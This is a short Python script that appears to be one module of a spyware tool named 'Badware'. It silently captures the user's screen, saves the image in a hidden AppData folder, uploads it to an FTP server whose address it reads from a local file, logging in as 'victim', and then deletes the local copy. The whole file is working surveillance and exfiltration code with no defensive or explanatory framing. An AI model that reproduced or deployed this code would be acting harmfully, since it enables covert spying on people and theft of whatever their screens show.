import pyautogui
import ftplib
import os
username = os.getlogin()
with open(fr"C:\users\{username}\AppData\Local\Aryan\Badware\ftpserver", "r") as servername:
	server = servername.read()
myScreenshot = pyautogui.screenshot()
if os.path.isfile(fr'C:\users\{username}\AppData\local\Aryan\Badware\screen.png'):
    os.remove(fr'C:\users\{username}\AppData\local\Aryan\Badware\screen.png')
myScreenshot.save(fr'C:\users\{username}\AppData\local\Aryan\Badware\screen.png')
session = ftplib.FTP(server,'victim','victimpass1234')
with open(fr'C:\users\{username}\AppData\local\Aryan\Badware\screen.png', 'rb') as shot:
    session.storbinary('STOR screen.png', shot)
session.quit()
os.remove(fr'C:\users\{username}\AppData\local\Aryan\Badware\screen.png')